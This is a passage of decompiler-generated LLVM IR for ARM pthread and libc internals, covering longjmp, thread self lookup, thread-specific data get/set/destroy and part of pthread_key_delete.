  %v1_f8cc = add i32 %v0_f8cc, 60
  %storemerge.in3 = inttoptr i32 %v1_f8cc to i32*
  %storemerge4 = load i32, i32* %storemerge.in3, align 4
  store i32 %storemerge4, i32* %r4.global-to-local, align 4
  %v2_f8ec6 = icmp eq i32 %storemerge4, 0
  br i1 %v2_f8ec6, label %dec_label_pc_f900, label %dec_label_pc_f8f4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8f4
  %v1_f8d4 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_f8dc, %v1_f8d4
  br i1 %tmp, label %dec_label_pc_f8dc, label %dec_label_pc_f8b4

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f8d4
  %v1_f8dc = add i32 %v0_f8dc, 4
  %v2_f8dc = inttoptr i32 %v1_f8dc to i32*
  %v3_f8dc = load i32, i32* %v2_f8dc, align 4
  store i32 %v3_f8dc, i32* @r0, align 4
  %v1_f8e4 = inttoptr i32 %v0_f8dc to i32*
  %v2_f8e4 = load i32, i32* %v1_f8e4, align 4
  call void @__pseudo_branch(i32 %v2_f8e4)
  %v0_f8e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8e8 = add i32 %v0_f8e8, 12
  %storemerge.in = inttoptr i32 %v1_f8e8 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_f8ec = icmp eq i32 %storemerge, 0
  br i1 %v2_f8ec, label %dec_label_pc_f900, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8cc, %dec_label_pc_f8dc
  %v0_f8dc = phi i32 [ %storemerge, %dec_label_pc_f8dc ], [ %storemerge4, %dec_label_pc_f8cc ]
  %v0_f8f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8f4 = add i32 %v0_f8f4, 32
  %v2_f8f4 = inttoptr i32 %v1_f8f4 to i32*
  %v3_f8f4 = load i32, i32* %v2_f8f4, align 4
  %v3_f8f8 = icmp ult i32 %v0_f8dc, %v3_f8f4
  br i1 %v3_f8f8, label %dec_label_pc_f8d4, label %dec_label_pc_f900

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8f4, %dec_label_pc_f8dc, %dec_label_pc_f8cc, %dec_label_pc_f8b4
  %v0_f908 = phi i32 [ 0, %dec_label_pc_f8b4 ], [ 0, %dec_label_pc_f8cc ], [ %v0_f8dc, %dec_label_pc_f8f4 ], [ 0, %dec_label_pc_f8dc ]
  %v0_f900 = load i32, i32* %r5.global-to-local, align 4
  %v1_f900 = add i32 %v0_f900, 84
  %v2_f900 = inttoptr i32 %v1_f900 to i32*
  %v3_f900 = load i32, i32* %v2_f900, align 4
  store i32 %v3_f900, i32* %r2.global-to-local, align 4
  %v2_f904 = icmp eq i32 %v3_f900, 0
  %v2_f908 = add i32 %v0_f900, 60
  %v3_f908 = inttoptr i32 %v2_f908 to i32*
  store i32 %v0_f908, i32* %v3_f908, align 4
  br i1 %v2_f904, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_f900
  %v3_f90c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_f90c, i32* @r4, align 4
  %v18_f90c = load i32, i32* @r0, align 4
  ret i32 %v18_f90c

bb19:                                             ; preds = %dec_label_pc_f900
  %v0_f910 = load i32, i32* %r7.global-to-local, align 4
  %v1_f910 = add i32 %v0_f910, 32
  %v2_f910 = inttoptr i32 %v1_f910 to i32*
  %v3_f910 = load i32, i32* %v2_f910, align 4
  %v0_f914 = load i32, i32* %r2.global-to-local, align 4
  %v3_f914 = icmp ult i32 %v0_f914, %v3_f910
  br i1 %v3_f914, label %bb20, label %.thread2

bb20:                                             ; preds = %bb19
  %v2_f91c = load i32, i32* %r5.global-to-local, align 4
  %v3_f91c = add i32 %v2_f91c, 84
  %v4_f91c = inttoptr i32 %v3_f91c to i32*
  store i32 0, i32* %v4_f91c, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb19, %bb20
  %v2_f920 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f920, i32* @r4, align 4
  %v17_f920 = load i32, i32* @r0, align 4
  ret i32 %v17_f920

; uselistorder directives
  uselistorder i32 %v0_f8dc, { 1, 4, 0, 2, 3 }
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 -480, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_f8f4, { 1, 0 }
  uselistorder label %dec_label_pc_f8cc, { 3, 2, 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f944 = call i32 @pthread_cleanup_upto()
  %v0_f948 = load i32, i32* @r4, align 4
  %v0_f94c = load i32, i32* @r5, align 4
  %v2_f950 = call i32 @_longjmp(i32 %v0_f948, i32 %v0_f94c)
  ret i32 %v2_f950
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f95c = call i32 @pthread_cleanup_upto()
  %v0_f960 = load i32, i32* @r4, align 4
  %v0_f964 = load i32, i32* @r5, align 4
  %v2_f968 = call i32 @_longjmp(i32 %v0_f960, i32 %v0_f964)
  ret i32 %v2_f968

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @_thread_self.12() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_f970 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_f974 = load i32, i32* @sp, align 4
  %v3_f974 = icmp ult i32 %v0_f974, %v2_f970
  %v1_f978 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f978, i32* @r1, align 4
  br i1 %v3_f974, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_f994, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_f994 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_f988 = load i32, i32* @global_var_2b170.180, align 4
  %v3_f98c = icmp ult i32 %v0_f974, %v2_f988
  br i1 %v3_f98c, label %bb4, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %bb3
  %v2_f998 = load i32, i32* @global_var_2b174.182, align 4
  %v3_f99c = icmp ult i32 %v0_f974, %v2_f998
  br i1 %v3_f99c, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_f994, %bb3
  %v2_f9ac = load i32, i32* @global_var_2f558.186, align 4
  store i32 %v2_f9ac, i32* @r2, align 4
  %v3_f9b0 = and i32 %v1_f978, -2097152
  %v4_f9b0 = xor i32 %v3_f9b0, -2097152
  %v2_f9b8 = icmp eq i32 %v2_f9ac, 0
  %v1_f9bc = sub i32 -477, %v4_f9b0
  br i1 %v2_f9b8, label %dec_label_pc_f9c8, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %bb4
  %v1_f9c4 = call i32 @__pthread_find_self(i32 %v1_f9bc)
  br label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %bb4, %dec_label_pc_f9c4
  %v0_f9c8 = phi i32 [ %v1_f9bc, %bb4 ], [ %v1_f9c4, %dec_label_pc_f9c4 ]
  %v1_f9c8 = add i32 %v0_f9c8, -3
  ret i32 %v1_f9c8

; uselistorder directives
  uselistorder i32 %v1_f9bc, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_find_self, { 5, 0, 10, 4, 9, 3, 2, 8, 7, 6, 1 }
  uselistorder i32 -2097152, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22 }
  uselistorder i32* @global_var_2f558.186, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* @global_var_2b174.182, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 16, 1, 2, 11, 12, 13, 14, 15 }
  uselistorder i32* @global_var_2b170.180, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 16, 1, 11, 12, 13, 14, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), { 1, 0, 13, 2, 3, 4, 5, 12, 14, 6, 7, 8, 9, 11, 15, 16, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_2a3e0 to i32), { 2, 0, 12, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_2b16c.177, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder label %dec_label_pc_f9c8, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v0_f9f0 = call i32 @_thread_self.12()
  %v4_f9f4 = mul i32 %arg1, 4
  %v5_f9f4 = add i32 %v0_f9f0, 364
  %v1_f9f8 = add i32 %v5_f9f4, %v4_f9f4
  ret i32 %v1_f9f8
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v0_fa08 = call i32 @_thread_self.12()
  %v4_fa0c = mul i32 %arg1, 4
  %v5_fa0c = add i32 %v4_fa0c, %v0_fa08
  %v1_fa10 = add i32 %v5_fa0c, 364
  %v2_fa10 = inttoptr i32 %v1_fa10 to i32*
  %v3_fa10 = load i32, i32* %v2_fa10, align 4
  ret i32 %v3_fa10
}

define i32 @__pthread_internal_tsd_set() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_fa18 = load i32, i32* @r4, align 4
  store i32 %v3_fa18, i32* %stack_var_-12, align 4
  %v0_fa1c = load i32, i32* @r0, align 4
  %v0_fa20 = load i32, i32* @r1, align 4
  %v0_fa24 = call i32 @_thread_self.12()
  %v4_fa28 = mul i32 %v0_fa1c, 4
  %v5_fa28 = add i32 %v0_fa24, 364
  %v2_fa2c = add i32 %v5_fa28, %v4_fa28
  %v3_fa2c = inttoptr i32 %v2_fa2c to i32*
  store i32 %v0_fa20, i32* %v3_fa2c, align 4
  %v2_fa34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fa34, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @pthread_getspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_fa38 = icmp ugt i32 %arg1, 1023
  %v3_fa3c = load i32, i32* @r4, align 4
  store i32 %v3_fa3c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v2_fa38, label %.thread, label %dec_label_pc_fa48

dec_label_pc_fa48:                                ; preds = %entry
  %v0_fa48 = call i32 @_thread_self.12()
  %v0_fa4c = load i32, i32* %r4.global-to-local, align 4
  %v3_fa4c = udiv i32 %v0_fa4c, 32
  %v4_fa50 = mul nuw nsw i32 %v3_fa4c, 4
  %v5_fa50 = add i32 %v4_fa50, %v0_fa48
  %v1_fa54 = add i32 %v5_fa50, 236
  %v2_fa54 = inttoptr i32 %v1_fa54 to i32*
  %v3_fa54 = load i32, i32* %v2_fa54, align 4
  %v2_fa58 = icmp eq i32 %v3_fa54, 0
  br i1 %v2_fa58, label %.thread, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %dec_label_pc_fa48
  %v4_fa64 = mul i32 %v0_fa4c, 8
  %v5_fa64 = add i32 %v4_fa64, ptrtoint (i32* @global_var_2b1b0.528 to i32)
  %v6_fa64 = inttoptr i32 %v5_fa64 to i32*
  %v7_fa64 = load i32, i32* %v6_fa64, align 4
  %v2_fa6c = icmp eq i32 %v7_fa64, 0
  br i1 %v2_fa6c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fa60
  %v1_fa68 = urem i32 %v0_fa4c, 32
  %v5_fa70 = mul nuw nsw i32 %v1_fa68, 4
  %v6_fa70 = add i32 %v3_fa54, %v5_fa70
  %v7_fa70 = inttoptr i32 %v6_fa70 to i32*
  %v8_fa70 = load i32, i32* %v7_fa70, align 4
  %v3_fa74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_fa74, i32* %r4.global-to-local, align 4
  ret i32 %v8_fa70

.thread:                                          ; preds = %dec_label_pc_fa60, %dec_label_pc_fa48, %entry
  %v2_fa7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa7c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_fa4c, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fa84 = load i32, i32* @r4, align 4
  store i32 %v3_fa84, i32* %stack_var_-20, align 4
  %v9_fa84 = load i32, i32* @r6, align 4
  %v0_fa88 = call i32 @_thread_self.12()
  store i32 0, i32* @r7, align 4
  store i32 %v0_fa88, i32* @r6, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa9c.lr.ph

dec_label_pc_fa9c:                                ; preds = %dec_label_pc_fa9c.lr.ph, %dec_label_pc_fb00
  %v1_fa9c = phi i32 [ 0, %dec_label_pc_fa9c.lr.ph ], [ %v1_fb00, %dec_label_pc_fb00 ]
  %v0_fa9c = phi i32 [ %v0_fb2c35, %dec_label_pc_fa9c.lr.ph ], [ %v0_fa9c20, %dec_label_pc_fb00 ]
  %v8_fb1817 = phi i32 [ 0, %dec_label_pc_fa9c.lr.ph ], [ %v8_fb1816, %dec_label_pc_fb00 ]
  %v4_fa9c = mul i32 %v1_fa9c, 4
  %v5_fa9c = add i32 %v4_fa9c, %v0_fa9c
  %v1_faa0 = add i32 %v5_fa9c, 236
  %v2_faa0 = inttoptr i32 %v1_faa0 to i32*
  %v3_faa0 = load i32, i32* %v2_faa0, align 4
  %v2_faa4 = icmp eq i32 %v3_faa0, 0
  store i1 %v2_faa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faa4, label %dec_label_pc_fb00, label %dec_label_pc_fae8.preheader

dec_label_pc_fae8.preheader:                      ; preds = %dec_label_pc_fa9c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fab4:                                ; preds = %dec_label_pc_fae8
  %v4_faec = mul i32 %v1_faf4, 32
  %v5_faec = add i32 %v4_faec, %v2_fad4
  %v4_faf8 = mul i32 %v5_faec, 8
  %v4_faf4 = mul i32 %v1_faf4, 4
  %v5_faf4 = add i32 %v4_faf4, %v0_faf4
  %v1_fab4 = add i32 %v5_faf4, 236
  %v2_fab4 = inttoptr i32 %v1_fab4 to i32*
  %v3_fab4 = load i32, i32* %v2_fab4, align 4
  %v1_fab8 = add i32 %v4_faf8, add (i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32 4)
  %v2_fab8 = inttoptr i32 %v1_fab8 to i32*
  %v3_fab8 = load i32, i32* %v2_fab8, align 4
  %v4_fabc = mul i32 %v2_fad4, 4
  %v5_fabc = add i32 %v3_fab4, %v4_fabc
  %v6_fabc = inttoptr i32 %v5_fabc to i32*
  %v2_fac0 = icmp eq i32 %v3_fab8, 0
  br i1 %v2_fac0, label %dec_label_pc_fad0, label %bb

bb:                                               ; preds = %dec_label_pc_fab4
  %v7_fabc = load i32, i32* %v6_fabc, align 4
  %v3_fac4 = icmp eq i32 %v7_fabc, 0
  br label %dec_label_pc_fad0

dec_label_pc_fad0:                                ; preds = %dec_label_pc_fab4, %bb
  %storemerge36 = phi i1 [ %v3_fac4, %bb ], [ %v2_fac0, %dec_label_pc_fab4 ]
  store i1 %storemerge36, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %v6_fabc, align 4
  call void @__pseudo_branch(i32 %v3_fab8)
  %v0_fae4 = load i32, i32* %r5.global-to-local, align 4
  %v1_fae4 = add i32 %v0_fae4, 1
  store i32 %v1_fae4, i32* %r5.global-to-local, align 4
  %v1_faec.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_faf4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_fae8.preheader, %dec_label_pc_fad0
  %v0_faf4 = phi i32 [ %v0_fa9c, %dec_label_pc_fae8.preheader ], [ %v0_faf4.pre, %dec_label_pc_fad0 ]
  %v1_faf4 = phi i32 [ %v1_fa9c, %dec_label_pc_fae8.preheader ], [ %v1_faec.pre, %dec_label_pc_fad0 ]
  %v2_fad4 = phi i32 [ 0, %dec_label_pc_fae8.preheader ], [ %v1_fae4, %dec_label_pc_fad0 ]
  %v8_fb1815 = phi i32 [ %v8_fb1817, %dec_label_pc_fae8.preheader ], [ 1, %dec_label_pc_fad0 ]
  %v7_faf0 = icmp eq i32 %v2_fad4, 31
  store i1 %v7_faf0, i1* %cpsr_z.global-to-local, align 1
  %v7_fafc = icmp sgt i32 %v2_fad4, 31
  br i1 %v7_fafc, label %dec_label_pc_fb00, label %dec_label_pc_fab4

dec_label_pc_fb00:                                ; preds = %dec_label_pc_fae8, %dec_label_pc_fa9c
  %v0_fb00 = phi i32 [ %v1_fa9c, %dec_label_pc_fa9c ], [ %v1_faf4, %dec_label_pc_fae8 ]
  %v0_fa9c20 = phi i32 [ %v0_fa9c, %dec_label_pc_fa9c ], [ %v0_faf4, %dec_label_pc_fae8 ]
  %v8_fb1816 = phi i32 [ %v8_fb1817, %dec_label_pc_fa9c ], [ %v8_fb1815, %dec_label_pc_fae8 ]
  %v1_fb00 = add i32 %v0_fb00, 1
  store i32 %v1_fb00, i32* %r4.global-to-local, align 4
  %v7_fb04 = icmp eq i32 %v1_fb00, 31
  store i1 %v7_fb04, i1* %cpsr_z.global-to-local, align 1
  %v7_fb08 = icmp slt i32 %v1_fb00, 32
  br i1 %v7_fb08, label %dec_label_pc_fa9c, label %dec_label_pc_fb0c

dec_label_pc_fa9c.lr.ph:                          ; preds = %entry, %dec_label_pc_fb0c
  %v0_fb2c35 = phi i32 [ %v0_fa88, %entry ], [ %v0_fa9c20, %dec_label_pc_fb0c ]
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa9c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fb00
  %v0_fb0c.pre = load i32, i32* @r7, align 4
  %v1_fb0c = add i32 %v0_fb0c.pre, 1
  store i32 %v1_fb0c, i32* @r7, align 4
  %v9_fb18 = urem i32 %v8_fb1816, 2
  %v2_fb1c37 = icmp eq i32 %v9_fb18, 0
  %not.v7_fb14 = icmp sgt i32 %v1_fb0c, 3
  %v2_fb1c = or i1 %v2_fb1c37, %not.v7_fb14
  store i1 %v2_fb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb1c, label %dec_label_pc_fb2c, label %dec_label_pc_fa9c.lr.ph

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb0c
  %v1_fb2c = add i32 %v0_fa9c20, 28
  %v2_fb2c = inttoptr i32 %v1_fb2c to i32*
  %v3_fb2c = load i32, i32* %v2_fb2c, align 4
  %v2_fb34 = call i32 @__pthread_lock(i32 %v3_fb2c, i32 %v0_fa9c20)
  br label %dec_label_pc_fb54

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb54
  %v1_fb3c = add i32 %v5_fb54, 236
  %v2_fb3c = inttoptr i32 %v1_fb3c to i32*
  %v3_fb3c = load i32, i32* %v2_fb3c, align 4
  store i32 %v3_fb3c, i32* @r0, align 4
  %v2_fb40 = icmp eq i32 %v3_fb3c, 0
  store i1 %v2_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb40, label %dec_label_pc_fb54, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb3c
  %v0_fb48 = call i32 @free()
  %v1_fb50 = load i32, i32* @r5, align 4
  %v2_fb50 = add i32 %v1_fb50, 12
  %v3_fb50 = inttoptr i32 %v2_fb50 to i32*
  store i32 0, i32* %v3_fb50, align 4
  br label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb3c, %dec_label_pc_fb48, %dec_label_pc_fb2c
  %v0_fb54 = load i32, i32* @r6, align 4
  %v1_fb54 = load i32, i32* @r4, align 4
  %v4_fb54 = mul i32 %v1_fb54, 4
  %v5_fb54 = add i32 %v4_fb54, %v0_fb54
  %v7_fb58 = icmp eq i32 %v1_fb54, 31
  store i1 %v7_fb58, i1* %cpsr_z.global-to-local, align 1
  %v1_fb5c = add i32 %v5_fb54, 224
  store i32 %v1_fb5c, i32* @r5, align 4
  %v1_fb60 = add i32 %v1_fb54, 1
  store i32 %v1_fb60, i32* @r4, align 4
  %v7_fb64 = icmp sgt i32 %v1_fb54, 31
  br i1 %v7_fb64, label %dec_label_pc_fb68, label %dec_label_pc_fb3c

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb54
  %v1_fb68 = add i32 %v0_fb54, 28
  %v2_fb68 = inttoptr i32 %v1_fb68 to i32*
  %v3_fb68 = load i32, i32* %v2_fb68, align 4
  %v2_fb6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fb6c, i32* %r4.global-to-local, align 4
  store i32 %v9_fa84, i32* @r6, align 4
  %v1_fb70 = call i32 @__pthread_unlock(i32 %v3_fb68)
  %v0_fb74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fb74, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_fb68
  %v1_fb74 = load i32, i32* @fp, align 4
  %v2_fb74 = trunc i32 %v1_fb74 to i16
  %v3_fb74 = load i32, i32* @r2, align 4
  %v4_fb74 = inttoptr i32 %v3_fb74 to i16*
  store i16 %v2_fb74, i16* %v4_fb74, align 2
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_fb68, %bb33
  ret i32 %v1_fb70

; uselistorder directives
  uselistorder i32 %v5_fb54, { 1, 0 }
  uselistorder i32 %v1_fb54, { 2, 0, 1, 3 }
  uselistorder i32 %v1_fb00, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fad4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_faf4, { 0, 2, 1 }
  uselistorder i32 %v3_fab8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 3, 7, 2, 6, 8, 0, 9, 1 }
  uselistorder i32 (i32)* @__pthread_unlock, { 48, 47, 46, 40, 39, 38, 37, 36, 35, 34, 33, 32, 2, 42, 51, 31, 30, 29, 28, 41, 27, 50, 26, 25, 24, 23, 22, 21, 20, 19, 18, 1, 0, 17, 16, 15, 10, 9, 8, 7, 6, 5, 12, 4, 49, 3, 45, 44, 43, 13, 14, 11 }
  uselistorder i32 (i32, i32)* @__pthread_lock, { 2, 35, 34, 33, 32, 27, 26, 24, 1, 29, 25, 23, 22, 21, 20, 28, 18, 19, 17, 16, 15, 14, 0, 13, 8, 7, 5, 10, 4, 6, 3, 31, 30, 11, 12, 9 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_fb54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa9c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_fae8, { 1, 0 }
  uselistorder label %dec_label_pc_fad0, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v2_fb78 = icmp ugt i32 %arg1, 1023
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r8, align 4
  br i1 %v2_fb78, label %dec_label_pc_fbf0, label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %entry
  %v4_fb90 = mul i32 %arg1, 8
  %v5_fb90 = add i32 %v4_fb90, ptrtoint (i32* @global_var_2b1b0.528 to i32)
  %v6_fb90 = inttoptr i32 %v5_fb90 to i32*
  %v7_fb90 = load i32, i32* %v6_fb90, align 4
  %v2_fb94 = icmp eq i32 %v7_fb90, 0
  %v3_fb98 = udiv i32 %arg1, 32
  store i32 %v3_fb98, i32* @r7, align 4
  br i1 %v2_fb94, label %dec_label_pc_fbf0, label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb8c
  %v0_fba0 = call i32 @_thread_self.12()
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v0_fba0, i32* @r6, align 4
  %v0_fbac = load i32, i32* @r7, align 4
  %v3_fbac = mul i32 %v0_fbac, 4
  %v4_fbac = add i32 %v3_fbac, %v0_fba0
  %v1_fbb0 = add i32 %v4_fbac, 224
  store i32 %v1_fbb0, i32* @r5, align 4
  %v1_fbb4 = add i32 %v4_fbac, 236
  %v2_fbb4 = inttoptr i32 %v1_fbb4 to i32*
  %v3_fbb4 = load i32, i32* %v2_fbb4, align 4
  %v2_fbb8 = icmp eq i32 %v3_fbb4, 0
  br i1 %v2_fbb8, label %dec_label_pc_fbc4, label %dec_label_pc_fbd8

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fba0
  %v2_fbc4 = call i32 @calloc(i32 32, i32 4)
  %v2_fbc8 = icmp eq i32 %v2_fbc4, 0
  store i32 12, i32* %r1.global-to-local, align 4
  br i1 %v2_fbc8, label %dec_label_pc_fbf4, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fbc4
  %v1_fbd4 = load i32, i32* @r5, align 4
  %v2_fbd4 = add i32 %v1_fbd4, 12
  %v3_fbd4 = inttoptr i32 %v2_fbd4 to i32*
  store i32 %v2_fbc4, i32* %v3_fbd4, align 4
  %v0_fbd8.pre = load i32, i32* @r6, align 4
  %v1_fbd8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba0, %dec_label_pc_fbd4
  %v1_fbd8 = phi i32 [ %v0_fbac, %dec_label_pc_fba0 ], [ %v1_fbd8.pre, %dec_label_pc_fbd4 ]
  %v0_fbd8 = phi i32 [ %v0_fba0, %dec_label_pc_fba0 ], [ %v0_fbd8.pre, %dec_label_pc_fbd4 ]
  %v4_fbd8 = mul i32 %v1_fbd8, 4
  %v5_fbd8 = add i32 %v4_fbd8, %v0_fbd8
  %v1_fbdc = add i32 %v5_fbd8, 236
  %v2_fbdc = inttoptr i32 %v1_fbdc to i32*
  %v3_fbdc = load i32, i32* %v2_fbdc, align 4
  %v0_fbe0 = load i32, i32* @r4, align 4
  %v1_fbe0 = urem i32 %v0_fbe0, 32
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_fbe8 = load i32, i32* @r8, align 4
  %v5_fbe8 = mul nuw nsw i32 %v1_fbe0, 4
  %v6_fbe8 = add i32 %v5_fbe8, %v3_fbdc
  %v7_fbe8 = inttoptr i32 %v6_fbe8 to i32*
  store i32 %v0_fbe8, i32* %v7_fbe8, align 4
  %v0_fbf4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fbf4

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_fb8c, %entry
  store i32 22, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fbf4

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fbc4, %dec_label_pc_fbd8, %dec_label_pc_fbf0
  %v0_fbf4 = phi i32 [ 12, %dec_label_pc_fbc4 ], [ %v0_fbf4.pre, %dec_label_pc_fbd8 ], [ 22, %dec_label_pc_fbf0 ]
  ret i32 %v0_fbf4

; uselistorder directives
  uselistorder i32 %v0_fba0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_fbf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fbd8, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 64536, i32* %lr.global-to-local, align 4
  %v2_fc14 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2d1b0.533 to i32))
  %v0_fc18 = load i32, i32* @r4, align 4
  %v2_fc18 = icmp ugt i32 %v0_fc18, 1023
  br i1 %v2_fc18, label %dec_label_pc_fc30, label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2b1b0.528 to i32), i32* %r1.global-to-local, align 4
  %v4_fc24 = mul i32 %v0_fc18, 8
  %v5_fc24 = add i32 %v4_fc24, ptrtoint (i32* @global_var_2b1b0.528 to i32)
  %v6_fc24 = inttoptr i32 %v5_fc24 to i32*
